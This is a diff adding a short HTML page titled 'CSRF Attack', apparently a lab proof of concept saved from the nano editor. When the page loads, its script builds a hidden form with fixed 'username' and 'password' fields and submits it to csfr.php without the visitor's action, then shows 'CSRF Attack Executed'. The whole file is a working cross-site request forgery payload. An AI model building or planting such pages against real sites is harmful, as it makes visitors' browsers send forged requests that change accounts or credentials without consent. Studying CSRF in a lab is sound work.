@@ -1,0 +1,34 @@
+  GNU nano 6.2                                          csfr.html                                                    
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+    <script>
+        function submitForm() {
+            var form = document.createElement("form");
+            form.method = "POST";
+            form.action = "csfr.php";
+
+            var username = document.createElement("input");
+            username.type = "hidden";
+            username.name = "username";
+            username.value = "host";
+
+            var password = document.createElement("input");
+            password.type = "hidden";
+            password.name = "password";
+            password.value = "pass";
+
+            form.appendChild(username);
+            form.appendChild(password);
+            document.body.appendChild(form);
+            form.submit();
+        }
+
+        window.onload = submitForm;
+    </script>
+</head>
+<body>
+    <h2>CSRF Attack Executed</h2>
+</body>
+</html>
